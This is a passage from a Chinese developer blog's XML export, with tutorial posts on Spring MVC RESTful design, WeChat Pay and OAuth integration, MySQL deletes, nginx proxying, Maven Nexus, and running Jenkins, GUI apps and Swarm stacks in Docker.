c1.connect(); Client c2 = new Client(); c2.connect(); Client c3 = new Client(); c3.connect(); new Thread(c1, "c1").start(); new Thread(c2, "c2").start(); new Thread(c3, "c3").start(); Thread.sleep(1000); c1.write("c1 aaa"); c2.write("c2 bbbb"); c3.write("c3 ccccc"); &#125; &#125;]]></content>
      <categories>
        <category>Socket</category>
        <category>Socket-01</category>
      </categories>
      <tags>
        <tag>Socket</tag>
        <tag>BIO</tag>
        <tag>NIO</tag>
        <tag>AIO</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[SpringMvc实现RESTful风格]]></title>
    <url>%2F2018%2F01%2F31%2Frestful%2F</url>
    <content type="text"><![CDATA[RESTful 什么是RESTful-符合REST约束风格和原则的应用程序或设计就是RESTful. 1234567eg: /emp/1 HTTP GET 查询id=1的emp /emp/1 HTTP DELETE 删除id=1的emp,实验中直接删除会报405错误，但是采用$.ajax异步删除就没问题 /emp/1 HTTP PUT 跟新emp /emp/add HTTP POST 新增emp Spring对RESTful的支持 Spring MVC 对 RESTful应用提供了以下支持 利用@RequestMapping 指定要处理请求的URI模板和HTTP请求的动作类型 利用@PathVariable讲URI请求模板中的变量映射到处理方法参数上 利用Ajax,在客户端发出PUT、DELETE动作的请求 123@RequestMapping(value = "/&#123;id&#125;", method = RequestMethod.GET) public String toUpdate(@PathVariable("id") Integer id, Model model) &#123;&#125; RequestMapping的一般应用格式@RequestMapping(value = “/{id}”, method = RequestMethod.GET) @RequestMapping(value = “/{id}”, method = RequestMethod.POST) @RequestMapping(value = “/{id}”, method = RequestMethod.DELETE) // 因为这个需要Ajax请求，所有返回的是个json @ResponseBody @RequestMapping(value = “/{id}”, method = RequestMethod.PUT) 客户端发送PUT，DELETE请求 , 可以采用Ajax方式发送PUT和DELETE请求123456789$.ajax( &#123; type : "DELETE", url : "/spring_crud_restful/emp/deleteEmp/" + id, dataType : "json", success : function(data) &#123; alert(data); location.href = "/spring_crud_restful/emp/listEmp/1"; &#125; &#125;); 静态资源访问处理采用RESTful架构后，需要将web.xml中控制器拦截的请求设置为/，这样会将css,js等静态资源进行拦截，发送404错误。 解决方法： –配置123&lt;mvc:resources/&gt; &lt;mvc:resources mapping=&quot;请求URI&quot; location=&quot;资源位置&quot; /&gt; –配置123&lt;mvc:default-servlet-handler/&gt; &lt;mvc:default-servlet-handler/&gt;]]></content>
      <categories>
        <category>Spring</category>
        <category>SpringMvc</category>
      </categories>
      <tags>
        <tag>RESTful</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[微信支付-服务商下的公众号支付]]></title>
    <url>%2F2018%2F01%2F20%2Fweixin-subapp-pay%2F</url>
    <content type="text"><![CDATA[服务商下的公众号支付在服务商模式下，必须传本公众号和用户的openid 给服务商来生成jsapi支付参数。最近有个坑，前端怎么调都是没法支付，只是转一下就没了。最后发现是服务商那里没有配置该子商户的公众号支付的域名：登陆服务商的微信商户后台，找到该子商户，点击配置，添加一个域名。 单例页面的微信支付如果是单例页面如vue ,就微信后台后台配置http://xxxx/#/pay/这里就是要求支付必须在2级目录里，paypage.vue得放在pay目录里。这样配置还是有坑的。例如：你的首页路由是:http://xxxx/#/goods/，如果一个ios设备先进来这个首页，那么它就固定在这个/goods/的路由上，导致你在微信后台配置的#/pay/不起作用。（ios固定了刚刚第一个进来的路由了嘛），安卓则没有这个“固定路由”的坑解决方法：做一个全局的一级路由，例如http://xxxx/#/project/,你的首页在http://xxxx/#/project/goods/ ,你的支付页在http://xxxx/#/project/pay。然后在微信后台配置支付目录为：http://xxxx/#/project/ 那就解决了ios的“固定路由”的坑了 微信分享出去的页面经过分销出去的页面都带有这样的from 参数 ：http://xxxx/?from=groupmessage#/paypage 或 http://xxxx/?from=singlemessage#/paypage 这个from参数直接影响支付的！！！，会报get_brand_wcpay_request:fail错误。解决方法：在这些页面里，跳转至后台，后台再重定向回前端来过滤掉from 参数。（2018年7月1日一个通宵遇到的坑）]]></content>
      <categories>
        <category>微信支付</category>
        <category>服务商下</category>
        <category>公众号支付</category>
      </categories>
      <tags>
        <tag>微信支付</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[微信网页授权]]></title>
    <url>%2F2018%2F01%2F18%2Fweixin-auth%2F</url>
    <content type="text"><![CDATA[微信网页授权最近做前后台分离，发现微信授权登陆做的很烦。域名跳来跳去的，跳晕了。微信的网页授权文档传送门 微信官方给出的步骤:1 第一步：用户同意授权，获取code 2 第二步：通过code换取网页授权access_token 3 第三步：刷新access_token（如果需要） 4 第四步：拉取用户信息(需scope为 snsapi_userinfo) 5 附：检验授权凭证（access_token）是否有效 实践思考前端判断用户的cookie为空，并且是微信浏览器，就跳转到长链接： 1https://open.weixin.qq.com/connect/oauth2/authorize?appid=公众号APPID&amp;redirect_uri=后台地址&amp;response_type=code&amp;scope=SCOPE&amp;state=前端拼接的随机字符串#wechat_redirect 用户的体验是：他打开了前端的一个网页，然后跳转到open.weixin.qq.com的网页，然后又杯重定向到后台的一个地址。最后，后台获取用户信息后，又重定向到前端的某一个页面。 我门可以思考一个这样的场景，你的朋友分享了一个商城的商品详情页面给你。你打开之后，有了以上的跳转体验，是不是很晕，但是用户用微信浏览器打开的时候是看不到地址的变化，只看到上面有一个绿色的进度条，加载了又加载了…。我们要的效果就是，用户打开这个商品详情页面就静默授权，然后回跳到该页面。 实现前端的实现： 前端在跳转前，使用cookie保存当前的请求的地址ori_path，还要保存一个md5(时间+随机数) 的值md5_str，拼到长链接里。 1https://open.weixin.qq.com/connect/oauth2/authorize?appid=公众号APPID&amp;redirect_uri=后台地址&amp;response_type=code&amp;scope=SCOPE&amp;state=md5_str#wechat_redirect 拼好后，跳转！ -》微信官方-》后台-》前端某一个具体的地址/auth 这时候，前端在/auth的页面里，cookie拿出md5_str,去异步请求后台获取用户数据，再拿出之前存的地址ori_path去跳转。 后台的实现： 做一个controller,接受微信官方的请求，微信会带来code 和state (md5_str)拿到code就可以拿到用户信息，具体查看微信公众号文档传送门,然后，用户数据和state(md5_str)保存起来 再做一个controller，接受前端发来的md5_str,去拿用户数据]]></content>
      <categories>
        <category>微信公众号</category>
        <category>网页授权</category>
      </categories>
      <tags>
        <tag>微信公众号</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[微信公众号支付]]></title>
    <url>%2F2018%2F01%2F18%2Fweixin-mppay%2F</url>
    <content type="text"><![CDATA[微信公众号支付如果是服务商下的公众号发起公众号支付，必须有以下参数用户在子公众号下的openid 开发者调试的时候找不到子公众号的openid1.开发者先关注该服务商下的被服务的公众号（这里叫子公众号）2.在子公众号里的用户管理下，新建一个标签“开发”,把开发人员拉进去3.在线上调试工具先获取access_token,4.在微信文档-标签,先调用获取公众号已创建的标签，再调用获取标签下粉丝列表5.如果你想查询一下该openid的具体用户信息，请调用微信文档-用户信息里的获取用户基本信息]]></content>
      <categories>
        <category>微信支付</category>
        <category>公众号支付</category>
      </categories>
      <tags>
        <tag>微信支付</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[mysql中delete语句使用别名]]></title>
    <url>%2F2018%2F01%2F17%2Fmysql-delete%2F</url>
    <content type="text"><![CDATA[delete语法中使用别名问题1delete from a_table A where A.name = '123'; 但是有一个错误 1You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 解决方法在delete 与from之间加上一个别名 1delete A from a_table A where A.name = '123'; 删除成功! 关联表，删除多行数据清理orders表: 当orders的order_id 在order_detial 表和order_status 表中没有，则清理orders.order_id对应的orders表数据 123456789delete tos from orders tos , ( select os.order_id from orders os where os.order_id not in ( select tmp.order_id from ( select distinct o.order_id from order_detail o union all select distinct os.order_id from order_status os ) tmp) ) as utmp where tos.order_id =utmp.order_id;]]></content>
      <categories>
        <category>mysql</category>
        <category>delete</category>
      </categories>
      <tags>
        <tag>mysql</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[nginx反向代理tomcat]]></title>
    <url>%2F2018%2F01%2F16%2Fnginx-proxy%2F</url>
    <content type="text"><![CDATA[反向代理tomcat并提供web服务定义了两个server每个server指定一个域名dev.mall.com指向一个web应用api.mall.com反向代理到8080端口tomcat上 123456789101112131415161718192021222324252627server&#123; listen 80; server_name dev.mall.com; access_log /www/wwwlogs/mall-acess_log; location / &#123; root /www/wwwroot/mall; &#125;&#125;server&#123; listen 80; server_name api.mall.com; access_log /www/wwwlogs/mall-api-acess_log; location / &#123; proxy_pass http://127.0.0.1:8080; proxy_read_timeout 300; proxy_connect_timeout 300; proxy_redirect off; proxy_set_header Host $host; proxy_set_header X-Real-IP $remote_addr; proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for; &#125;&#125;]]></content>
      <categories>
        <category>nginx</category>
      </categories>
      <tags>
        <tag>nginx</tag>
        <tag>tomcat</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[maven nexus 私库配置]]></title>
    <url>%2F2018%2F01%2F15%2Fmaven-nexus%2F</url>
    <content type="text"><![CDATA[nexus的配置使用docker 安装nexus 1docker run -d -p 32770:8081 --name nexus sonatype/nexus 1.访问http://localhost:32770/nexus2.在节点增加一个用户 setting.xml12345&lt;server&gt; &lt;id&gt;rrg&lt;/id&gt; &lt;username&gt;rrg&lt;/username&gt; &lt;password&gt;rrg88888&lt;/password&gt;&lt;/server&gt; 3.修改central为阿里云的代理4.修改setting文件，包括mirro 和profile setting.xml1234567891011121314151617181920212223242526272829303132333435363738394041424344&lt;!--mirrors节点添加如下：--&gt; &lt;mirror&gt; &lt;id&gt;local-nexus3&lt;/id&gt; &lt;mirrorOf&gt;*&lt;/mirrorOf&gt; &lt;name&gt;local maven3&lt;/name&gt; &lt;url&gt;http://localhost:32770/nexus/content/groups/public/&lt;/url&gt; &lt;/mirror&gt; &lt;!--profiles节点添加如下：--&gt; &lt;profile&gt; &lt;id&gt;dev&lt;/id&gt; &lt;repositories&gt; &lt;repository&gt; &lt;id&gt;central&lt;/id&gt; &lt;name&gt;local-maven-main-repository&lt;/name&gt; &lt;url&gt;http://localhost:32770/nexus/content/groups/public/&lt;/url&gt; &lt;releases&gt; &lt;enabled&gt;true&lt;/enabled&gt; &lt;/releases&gt; &lt;snapshots&gt; &lt;enabled&gt;true&lt;/enabled&gt; &lt;/snapshots&gt; &lt;/repository&gt; &lt;/repositories&gt; &lt;pluginRepositories&gt; &lt;pluginRepository&gt; &lt;id&gt;central&lt;/id&gt; &lt;name&gt;local-maven-plugin-repository&lt;/name&gt; &lt;url&gt;http://localhost:32770/nexus/content/groups/public/&lt;/url&gt; &lt;releases&gt; &lt;enabled&gt;true&lt;/enabled&gt; &lt;/releases&gt; &lt;snapshots&gt; &lt;enabled&gt;false&lt;/enabled&gt; &lt;/snapshots&gt; &lt;/pluginRepository&gt; &lt;/pluginRepositories&gt; &lt;/profile&gt;&lt;!-- 最后激活 --&gt; &lt;activeProfiles&gt; &lt;activeProfile&gt;dev&lt;/activeProfile&gt; &lt;/activeProfiles&gt; 5.发布与部署6.使用7.发布第3方包]]></content>
      <categories>
        <category>maven</category>
        <category>nexus</category>
      </categories>
      <tags>
        <tag>maven</tag>
        <tag>nexus</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[docker-gui]]></title>
    <url>%2F2017%2F12%2F25%2Fdocker-gui%2F</url>
    <content type="text"><![CDATA[在Mac上使用Docker运行GUI应用程序firefoxvscode 需要准备的东西： osx系统 docker for mac XQartz 2.7.11 一位国外的美女大神写的Dockerfile osx系统没有就不用看下去docker for mac 自行安装XQuartz使用brew 安装 1brew cask install xquartz 关于Quartz的最新版，可以前往XQuartz官网 运行起来！使用我们本机的终端来打开XQuartz 1open -a XQuartz 我们就运行起来了xquartz的终端，我们打开它的偏好设置 把这个钩上，然后重启XQuartz就生效。 我们在XQuartz的终端输入一下命令,来允许你本机的连接: 12ip=$(ifconfig en0 | grep inet | awk '$1=="inet" &#123;print $2&#125;')xhost + $ip 设置好之后，我们就可以运行一下Jessie大神做的Firefox镜像，她写的dockerfile在这 firefox: 1docker run -d --name firefox -e DISPLAY=$ip:0 -v /tmp/.X11-unix:/tmp/.X11-unix jess/firefox vscode: 1docker run -v /etc/localtime:/etc/localtime:ro -v /tmp/.X11-unix:/tmp/.X11-unix -e DISPLAY=$ip:0 --name vscode jess/vscode chrome(记得加上–privileged):因为Chrome使用的是沙盒，因此运行一个没权限的沙盒将等到一个错误：Failed to move to new namespace: PID namespaces supported, Network namespace supported, but failed: errno = Operation not permitted使用--privileged可以给容器赋予权限去访问主机的资源，就如主机的进程那样访问主机的资源。 1docker run -d -v /tmp/.X11-unix:/tmp/.X11-unix -e DISPLAY=$ip:0 -v ~/Downloads:/root/Downloads --privileged --name chrome jess/chrome Merry Christmas]]></content>
      <categories>
        <category>Docker</category>
        <category>部署例子</category>
        <category>运行GUI应用程序</category>
      </categories>
      <tags>
        <tag>Docker</tag>
        <tag>GUI</tag>
        <tag>FireFox</tag>
        <tag>VSCode</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[在docker里运行Jenkins]]></title>
    <url>%2F2017%2F12%2F23%2Fdocker-jenkins%2F</url>
    <content type="text"><![CDATA[Jenkins123#注意/your/home 替换成你创建的目录，保证容器有访问权限docker run -d -p 12821:8080 -p 50000:50000 -v /your/home:/var/jenkins_home --name jenkins jenkins/jenkins5cc5e09fdea5e9296bd26095b90f770b0d05213d80299d44dd3984db14bdbd85 然后登陆到容器里获取初始化密码: 1234567docker exec -it 5cc5e09fdea5 bash#使用cat 命令查看密码jenkins@5cc5e09fdea5:/$ cat /var/jenkins_home/secrets/initialAdminPassword#然后出来这个密码44fcdb88xxxxxxxxxxx6a2d00c2d 把上面的密码复制到浏览器里http://localhost:12821 里需要密码的地方:]]></content>
      <categories>
        <category>Docker</category>
        <category>部署例子</category>
        <category>Jenkins</category>
      </categories>
      <tags>
        <tag>Docker</tag>
        <tag>Jenkins</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Docker入门-part5-Stacks]]></title>
    <url>%2F2017%2F12%2F22%2Fdocker-part5%2F</url>
    <content type="text"><![CDATA[Stacks前言本Docker入门系列文章是翻译于Docker官方getStarted文档,如有出入，请跳转查看官方文档 简单介绍 A stack is a group of interrelated services that share dependencies, and can be orchestrated and scaled together. 可以理解一个堆里有多个服务，服务之间相互协作。有一些复杂的应用，它可能需要多个堆。 添加一个新的服务并且部署它1.我们打开之前的docker-compose.yml文件，使用下面的代码覆盖它。记得替换那里username/repo:tag 对应的远程库镜像值。 123456789101112131415161718192021222324252627282930version: "3"services: web: # replace username/repo:tag with your name and image details image: username/repo:tag deploy: replicas: 5 restart_policy: condition: on-failure resources: limits: cpus: "0.1" memory: 50M ports: - "80:80" networks: - webnet visualizer: image: dockersamples/visualizer:stable ports: - "8080:8080" volumes: - "/var/run/docker.sock:/var/run/docker.sock" deploy: placement: constraints: [node.role == manager] networks: - webnetnetworks: webnet: 我们可以看到上面的代码里，多了一个服务：visualizer。并且看到一个新的关键字volumes ,它给visualizer容器权限，能访问宿主机的socket文件。还有一个新的关键字placement,定义这个服务只能在swarm manager上运行，不能在worker上。因为这个容器是用来展示Docker的各种服务在一个图表里，它由Docker开发的并且开源。 2.设置你的shell连接上myvm1 ，上部分已经讲过： docker-machine ls docker-machine env myvm1 eval $(docker-machine env myvm1) 3.在manager节点上再次运行docker stack deploy,如下： 1docker stack deploy -c docker-compose.yml getstartedlab 4.我们来看看visualizer先使用docker-machine ls查看各个节点的ip,然后你用浏览访问任何一个ip的8080端口，就可以看到图像化界面，显示各种服务在不同的机器上运行。 我们可以看到,visualizer只运行在manager节点上。 可以使用docker stack ps getstartedlab查看该堆所有服务的任务。 持久化数据让我们添加一个Redis 数据库 用来存储数据 1.我们打开之前的docker-compose.yml文件，使用下面的代码覆盖它。记得替换那里username/repo:tag 对应的远程库镜像值。 123456789101112131415161718192021222324252627282930313233343536373839404142version: "3"services: web: # replace username/repo:tag with your name and image details image: username/repo:tag deploy: replicas: 5 restart_policy: condition: on-failure resources: limits: cpus: "0.1" memory: 50M ports: - "80:80" networks: - webnet visualizer: image: dockersamples/visualizer:stable ports: - "8080:8080" volumes: - "/var/run/docker.sock:/var/run/docker.sock" deploy: placement: constraints: [node.role == manager] networks: - webnet redis: image: redis ports: - "6379:6379" volumes: - /home/docker/data:/data deploy: placement: constraints: [node.role == manager] command: redis-server --appendonly yes networks: - webnetnetworks: webnet: 2.在manager机器上（即myvm1）,创建一个目录：./data 1docker-machine ssh myvm1 "mkdir ./data" 这里注意几点: redis 的远程镜像就是很短：”redis”,不用质疑 redis容器对外服务端口依然是6379,方便其他服务获取。 redis的volumes 的/home/docker/data目录是myvm1的目录，因为下面定义了它只能部署在manager上，所以我们使用docker-machine ssh myvm1 &quot;mkdir ./data&quot; 创建一个/home/docker/data目录。然后冒号后边的/data是redis容器里的路径，这里是redis的工作路径，我们不用管。 3.保证你的shell连接上myvm1 ,前面讲过 4.重新部署,再次执行： 1docker stack deploy -c docker-compose.yml getstartedlab 5.查看服务： 1docker service ls 6.访问你的一个节点机器 http://192.168.99.101 ,我们可以看到Visits在递增，那是因为我们的数据存在Redis上了。我们继续看看http://192.168.99.101:8080]]></content>
      <categories>
        <category>Docker</category>
        <category>Docker入门</category>
      </categories>
      <tags>
        <tag>Docker</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Docker入门-part4-Swarms]]></title>
    <url>%2F2017%2F12%2F22%2Fdocker-part4%2F</url>
    <content type="text"><![CDATA[Swarms前言本Docker入门系列文章是翻译于Docker官方getStarted文档,如有出入，请跳转查看官方文档 简单介绍 Here in part 4, you deploy this application onto a cluster, running it on multiple machines. Multi-container, multi-machine applications are made possible by joining multiple machines into a “Dockerized” cluster called a swarm. 可以理解swarm 是一个种多宿主机器，多容器组成的机器群体。 你可以通过 Swarm manager来控制这种多容器，多机器组成的集群。这里的机器可以是真实的也可以是虚拟的。一旦加入了swarm ，就称为一个节点node。 建立你的swarm在你的机器上执行docker swarm init去启动swarm 模式，且成为swarm manager。使用其他的机器执行docker swarm join加入刚刚的swarm 群里成为worker。这里 我们使用虚拟机模拟一个由两台机器组成的集群。 创建cluster MAC, LINUX 先在宿主机上安装VirtualBox 使用docker-machine 命令，和VirtualBox的驱动： 12docker-machine create --driver virtualbox myvm1docker-machine create --driver virtualbox myvm2 使用以下命令获得机器列表和他们的ip 12345$docker-machine lsNAME ACTIVE DRIVER STATE URL SWARM DOCKER ERRORSmyvm1 - virtualbox Running tcp://192.168.99.100:2376 v17.11.0-ce myvm2 - virtualbox Running tcp://192.168.99.101:2376 v17.11.0-ce 初始化swarm 和添加节点 我们让myvm1成为manger,myvm2成为worker可以使用docker-machine ssh向 myvm1 发送docker swarm init命令格式是docker-machine ssh myvm1 &quot;docker swarm init --advertise-addr &lt;myvm1 ip&gt;&quot; 12345678 $ docker-machine ssh myvm1 "docker swarm init --advertise-addr 192.168.99.100"Swarm initialized: current node (qkxdnhw56ibpdwqt22jpvxtj6) is now a manager.To add a worker to this swarm, run the following command: docker swarm join --token SWMTKN-1-547x8uwxy9kjkf31c46q9bx74jb92v16y2ruoo6aabvv5rhq1r-36qjytbfe7i3dxu8tdp9fyfnr 192.168.99.100:2377To add a manager to this swarm, run 'docker swarm join-token manager' and follow the instructions. 同样地，我们向myvm2发送命令加入swarm,格式是： 123docker-machine ssh myvm2 "docker swarm join \--token &lt;token&gt; \&lt;ip&gt;:2377" 123$ docker-machine ssh myvm2 "docker swarm join --token SWMTKN-1-547x8uwxy9kjkf31c46q9bx74jb92v16y2ruoo6aabvv5rhq1r-36qjytbfe7i3dxu8tdp9fyfnr 192.168.99.100:2377"This node joined a swarm as a worker. 恭喜，你成功建立你的第一个swarm执行docker node ls 查看你的swarm中的各种节点: 12345$ docker-machine ssh myvm1 "docker node ls"ID HOSTNAME STATUS AVAILABILITY MANAGER STATUSqkxdnhw56ibpdwqt22jpvxtj6 * myvm1 Ready Active Leaderplax8po1p26hs67f693yqm5c7 myvm2 Ready Active 在你的swarm 集群部署你的APP上面艰难的步骤已经完了，接下来就简单了，重复Part3的步骤来部署在你新的swarm上，你只要记住，你的myvm1是管理者，只用来执行命令的，worker节点只是容纳过来的。他们都可以工作。 配置你的shell给swarm manager（可以理解为登陆到某个节点，不需要每次都docker-machine ssh） 这里提供mac / Linux的方法 1234567$ docker-machine env myvm1export DOCKER_TLS_VERIFY="1"export DOCKER_HOST="tcp://192.168.99.100:2376"export DOCKER_CERT_PATH="/Users/sam/.docker/machine/machines/myvm1"export DOCKER_MACHINE_NAME="myvm1"# Run this command to configure your shell:# eval $(docker-machine env myvm1) 然后运行 1eval $(docker-machine env myvm1) 现在你的shell已经登陆到myvm1上了，可以使用docker-machine ls 查看myvm1 的ACTIVE端是不是有个*号，表示你的shell登陆上这台机器 1234$ docker-machine lsNAME ACTIVE DRIVER STATE URL SWARM DOCKER ERRORSmyvm1 * virtualbox Running tcp://192.168.99.100:2376 v17.11.0-ce myvm2 - virtualbox Running tcp://192.168.99.101:2376 v17.11.0-ce 在swarm manager机器上部署你的APP虽然你现在的shell已经登陆上myvm1 了，但是还是可以访问本机的文件，这里我们部署app就需要之前写的docker-compose.yml文件。我们使用以下命令： 1$docker stack deploy -c docker-compose.yml getstartedlab 我们成功部署了APP，在这个集群上。使用以下查看详细的部署： 12345678910$ docker stack ps getstartedlabID NAME IMAGE NODE DESIRED STATE CURRENT STATE ERROR PORTSl546oo0pmewz getstartedlab_web.1 dk5664280/get-started:part2 myvm1 Running Preparing 25 seconds ago vdym3ibcbhku getstartedlab_web.2 dk5664280/get-started:part2 myvm2 Running Preparing 25 seconds ago x4gx5wzj7pp6 getstartedlab_web.3 dk5664280/get-started:part2 myvm2 Running Preparing 25 seconds ago imw4urn7oo9d getstartedlab_web.4 dk5664280/get-started:part2 myvm1 Running Preparing 26 seconds ago ios5s8yejbhj getstartedlab_web.5 dk5664280/get-started:part2 myvm2 Running Preparing 25 seconds ago vhkwaz09n4q8 getstartedlab_web.6 dk5664280/get-started:part2 myvm1 Running Preparing 25 seconds ago qybf5fd0ueij getstartedlab_web.7 dk5664280/get-started:part2 myvm2 Running Preparing 25 seconds ago 看到了，我们的app在补同的机器myvm1和myvm2上部署，它们组成了一个集群. 访问我们的集群你可以访问myvm1或myvm2,例如 http://192.168.99.100:4000或http://192.168.99.101:4000 ,你都可以得到返回结果，并且每次结果不一样，因为它们使用了swarm的一个负载均衡器。 重新调配你的app你可以修改你的docker-compose.yml,然后再运行 1docker stack deploy -c docker-compose.yml getstartedlab 清除和重启stacks 和swarms清除 stacks:docker stack rm getstartedlab 我们先不敢掉swarms,因为下一个Part 5,我们还用先保留以下。 如果你真想敢掉swarms,执行docker-machine ssh myvm2 &quot;docker swarm leave这样能使work机里开该swarm集群，docker-machine ssh myvm1 &quot;docker swarm leave --force 能使manager离开swarm 关掉所有机器执行下面的命令停止所有的机器： 1$docker-machine stop $(docker-machine ls -q) 清除shell配置1eval $(docker-machine env -u) 这样就可以中断连接虚拟机了。可以使用docker-machine ls查看，已经没有ACTIVE的机器了。 启动机器使用下面的代码启动机器 1docker-machine start &lt;machine-name&gt; socker是我打错了，ctrl+c 中断了该命令 总结123456789101112131415161718192021docker-machine create --driver virtualbox myvm1 # Create a VM (Mac, Win7, Linux)docker-machine create -d hyperv --hyperv-virtual-switch "myswitch" myvm1 # Win10docker-machine env myvm1 # View basic information about your nodedocker-machine ssh myvm1 "docker node ls" # List the nodes in your swarmdocker-machine ssh myvm1 "docker node inspect &lt;node ID&gt;" # Inspect a nodedocker-machine ssh myvm1 "docker swarm join-token -q worker" # View join tokendocker-machine ssh myvm1 # Open an SSH session with the VM; type "exit" to enddocker node ls # View nodes in swarm (while logged on to manager)docker-machine ssh myvm2 "docker swarm leave" # Make the worker leave the swarmdocker-machine ssh myvm1 "docker swarm leave -f" # Make master leave, kill swarmdocker-machine ls # list VMs, asterisk shows which VM this shell is talking todocker-machine start myvm1 # Start a VM that is currently not runningdocker-machine env myvm1 # show environment variables and command for myvm1eval $(docker-machine env myvm1) # Mac command to connect shell to myvm1&amp; "C:\Program Files\Docker\Docker\Resources\bin\docker-machine.exe" env myvm1 | Invoke-Expression # Windows command to connect shell to myvm1docker stack deploy -c &lt;file&gt; &lt;app&gt; # Deploy an app; command shell must be set to talk to manager (myvm1), uses local Compose filedocker-machine scp docker-compose.yml myvm1:~ # Copy file to node's home dir (only required if you use ssh to connect to manager and deploy the app)docker-machine ssh myvm1 "docker stack deploy -c &lt;file&gt; &lt;app&gt;" # Deploy an app using ssh (you must have first copied the Compose file to myvm1)eval $(docker-machine env -u) # Disconnect shell from VMs, use native dockerdocker-machine stop $(docker-machine ls -q) # Stop all running VMsdocker-machine rm $(docker-machine ls -q) # Delete all VMs and their disk images]]></content>
      <categories>
        <category>Docker</category>
        <category>Docker入门</category>
      </categories>
      <tags>
        <tag>Docker</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Docker入门-part3-Services]]></title>
    <url>%2F2017%2F12%2F22%2Fdocker-part3%2F</url>
    <content type="text"><![CDATA[关于服务 About services前言本Docker入门系列文章是翻译于Docker官方getStarted文档,如有出入，请跳转查看官方文档 简单介绍 In a distributed application, different pieces of the app are called “services.” For example, if you imagine a video sharing site, it probably includes a service for storing application data in a database, a service for video transcoding in the background after a user uploads something, a service for the front-end, and so on.Services are really just “containers in production.” A service only runs one image, but it codifies the way that image runs—what ports it should use, how many replicas of the container should run so the service has the capacity it needs, and so on. Scaling a service changes the number of container instances running that piece of software, assigning more computing resources to the service in the process.Luckily it’s very easy to define, run, and scale services with the Docker platform – just write a docker-compose.yml file. 可以理解为，服务包含多个容器。一个服务通过docker-compose.yml创建，里面定义了多个容器的行为，资源消耗等问题。 编写你的 docker-compose.yml 文件这个文件定义了容器的行为 docker-compose.yml文件在你喜欢的目录下，创建 一个文件叫docker-compose.yml，使用你之前在Part 2推送的镜像，更新一下下面中username/repo:tag 的位置代码： 12345678910111213141516171819version: "3"services: web: #使用之前你推送的镜像路径 替代这里的 username/repo:tag image: username/repo:tag deploy: replicas: 5 resources: limits: cpus: "0.1" memory: 50M restart_policy: condition: on-failure ports: - "4000:80" networks: - webnetnetworks: webnet: 文件解释这个文件告诉docker 去做以下的事： 拉取远程镜像 运行5个容器作为一个服务，命名为web;限制每一个的资源：最多10%CPU的使用和50MB内存 如果有一个容器宕机，立马重启它这个容器 映射宿主机的4000端口到web该服务的80端口 这里面的5个容器通过负载均衡网络webnet共享80端口 定义一个默认配置的网络webnet，它是一个负载均衡的网络(load-balanced overlay network) 运行你的负载均衡APP在我们使用docker stack deploy前先执行下面的命令： 1docker swarm init 注意：如果你不运行docker swarm init你将得到一个错误：“this node is not a swarm manager” 运行 以上命令后，使用一下命令给你的负载均衡APP命名，这里名为getstartedlab : 1docker stack deploy -c docker-compose.yml getstartedlab 如果你运行起来有***.***.*** must be a mapping 就说明的你yml配置文件格式不对 好了，我们来看看这个服务是不是有5个容器在运行，使用以下命令查看服务： 1docker service ls 我们可以看到服务name 是getstartedlab_web ，就是APP名__服务名的结合。这里服务中的每一个容器称为任务(Task)，这些任务都分配着唯一的ID，查看该服务的详细任务列表： 1docker service ps getstartedlab_web 以上 看到服务里各个任务id，当然容器对于外部系统来说，也有容器id: 1docker container ls -q 现在你可以使用curl -4 http://localhost:4000多次执行，或多次浏览该URL，你会发现所有不同，他们真的负载均衡了。你可以看到变得是容器ID,就是上面docker containter ls -q的结果之一。 调控你的APP你可以修改docker-compose.yml里的replicas的值，然后保存，再次执行：修改前我查看一下容器id列表： 123456$docker container ls -q6e64e22402783ccbef3e8459985e1fec14828c7dbe7aad8d6633801d7557 这里我修改replicas为7，然后保存，再次执行以下命令： 1docker stack deploy -c docker-compose.yml getstartedlab 再查看容器id列表： 12345678$docker container ls -qcc9987a174f1e4b0337fed8d6e64e22402783ccbef3e8459985e1fec14828c7dbe7aad8d6633801d7557 发现它保留了原来的容器，并增加两个新的容器：cc9987a174f1和e4b0337fed8d，说明调控任务数量时，它不会把原来的全部容器杀死，而是一种更新。 关闭你的app和关闭swarm关闭app 1docker stack rm getstartedlab 关闭swarm: 1docker swarm leave --force 总结12345678docker stack ls # List stacks or appsdocker stack deploy -c &lt;composefile&gt; &lt;appname&gt; # Run the specified Compose filedocker service ls # List running services associated with an appdocker service ps &lt;service&gt; # List tasks associated with an appdocker inspect &lt;task or container&gt; # Inspect task or containerdocker container ls -q # List container IDsdocker stack rm &lt;appname&gt; # Tear down an applicationdocker swarm leave --force # Take down a single node swarm from the manager]]></content>
      <categories>
        <category>Docker</category>
        <category>Docker入门</category>
      </categories>
      <tags>
        <tag>Docker</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Docker入门-part2-Containers]]></title>
    <url>%2F2017%2F12%2F22%2Fdocker-part2%2F</url>
    <content type="text"><![CDATA[容器Containers前言本Docker入门系列文章是翻译于Docker官方getStarted文档,如有出入，请跳转查看官方文档 定义Dockerfile文件新建一个空目录，cd进去，然后新建一个文件叫Dockerfile拷贝下面的内容进去。 1234567891011121314151617181920# Use an official Python runtime as a parent imageFROM python:2.7-slim# Set the working directory to /appWORKDIR /app# Copy the current directory contents into the container at /appADD . /app# Install any needed packages specified in requirements.txtRUN pip install --trusted-host pypi.python.org -r requirements.txt# Make port 80 available to the world outside this containerEXPOSE 80# Define environment variableENV NAME World# Run app.py when the container launchesCMD ["python", "app.py"] the app itself再拷贝两个文件，requirements.txt和app.py。把他们放到Dockerfile的相同目录里。这样Dockerfile就可以“ADD . /app” 把他们两个文件放进image镜象里。 requirements.txt12FlaskRedis app.py123456789101112131415161718192021222324from flask import Flaskfrom redis import Redis, RedisErrorimport osimport socket# Connect to Redisredis = Redis(host="redis", db=0, socket_connect_timeout=2, 